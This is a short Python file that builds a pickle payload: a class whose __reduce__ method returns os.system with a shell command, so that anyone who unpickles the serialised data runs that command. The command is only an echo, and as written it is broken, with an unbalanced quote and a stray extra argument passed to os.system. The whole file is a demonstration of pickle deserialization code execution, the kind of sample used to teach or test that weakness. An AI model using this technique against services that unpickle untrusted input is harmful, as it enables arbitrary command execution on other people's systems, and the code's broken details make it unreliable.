import pickle
import os


class Payload(object):
    def __reduce__(self):
        return (os.system, ("echo 'Hello, World!", 1),)


def makePickleData(payload: Payload):
    serialized_data = pickle.dumps(payload, protocol=0)
    return serialized_data